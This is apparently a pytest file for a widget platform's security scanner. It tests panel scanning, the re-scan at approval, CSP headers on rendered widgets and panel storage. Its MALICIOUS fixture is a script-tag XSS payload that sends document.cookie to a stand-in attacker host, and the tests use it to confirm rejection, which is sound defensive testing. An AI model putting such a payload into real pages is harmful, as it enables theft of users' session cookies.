"""Automated widget protection (product roadmap Phase 2): what the scanner
reads, the re-scan at approval, and the limits on a rendered widget."""

import pytest

from app.widgets.models import Widget
from tests.widgets._view_helpers import _create_widget, _make_approved_widget

MALICIOUS = "<script>fetch('https://evil.example/?c=' + document.cookie)</script>"


@pytest.fixture()
def admin(create_user, auth_header):
    create_user(username="boss", is_admin=True)
    return auth_header("boss")


def _submit(client, auth_header, widget_id):
    return client.post(
        "/widgets/submit", json={"widget_id": widget_id}, headers=auth_header("author")
    )


@pytest.mark.parametrize("panel", ["html_panel", "compute_panel"])
def test_code_in_any_panel_is_scanned(client, create_user, auth_header, panel):
    """Known gap: only `code` and `css` were scanned, so a script in the
    HTML panel went through unread."""
    create_user(username="author")
    widget = _create_widget(client, auth_header, "author", **{panel: MALICIOUS})

    submitted = _submit(client, auth_header, widget["id"]).json()

    assert submitted["status"] == "rejected"
    assert submitted["scan_passed"] is False


def test_approval_rescans_with_todays_rules(client, create_user, auth_header, admin, db_session):
    create_user(username="author")
    widget = _create_widget(client, auth_header, "author")
    assert _submit(client, auth_header, widget["id"]).json()["status"] == "submitted"
    # Stands in for code the scanner of the day missed, now caught.
    db_session.query(Widget).filter_by(id=widget["id"]).update({"html_panel": MALICIOUS})
    db_session.commit()

    reviewed = client.post(
        "/widgets/review", json={"widget_id": widget["id"], "action": "approve"}, headers=admin
    ).json()

    assert reviewed["status"] == "rejected"
    assert "Re-scan at approval failed" in reviewed["review_notes"]


def test_a_clean_widget_is_still_approved(client, create_user, auth_header, admin):
    create_user(username="author")
    widget = _create_widget(client, auth_header, "author")
    _submit(client, auth_header, widget["id"])
    reviewed = client.post(
        "/widgets/review", json={"widget_id": widget["id"], "action": "approve"}, headers=admin
    ).json()
    assert reviewed["status"] == "approved"


def test_a_rendered_widget_carries_its_limits(client, create_user, auth_header, db_session):
    widget_id = _make_approved_widget(client, auth_header, create_user, db_session)["id"]

    csp = client.get(f"/widgets/{widget_id}/render").headers["content-security-policy"]

    assert "frame-ancestors http://localhost:3000" in csp
    assert "form-action 'none'" in csp
    assert "base-uri 'none'" in csp


def test_the_panels_are_stored_on_create_and_update(client, create_user, auth_header):
    """Known bug: create accepted the panels and dropped them, so a widget's
    compute code and HTML/CSS panels were lost."""
    create_user(username="author")
    created = _create_widget(
        client, auth_header, "author",
        html_panel="<p>hi</p>", css_panel="p{}", compute_panel="print(1)",
        compute_language="python", execution_mode="server",
    )  # fmt: skip
    updated = client.put(
        f"/widgets/{created['id']}",
        json={"compute_panel": "print(2)"},
        headers=auth_header("author"),
    ).json()

    assert (created["html_panel"], created["css_panel"], created["compute_language"]) == (
        "<p>hi</p>", "p{}", "python",
    )  # fmt: skip
    assert created["execution_mode"] == "server"
    assert updated["compute_panel"] == "print(2)"
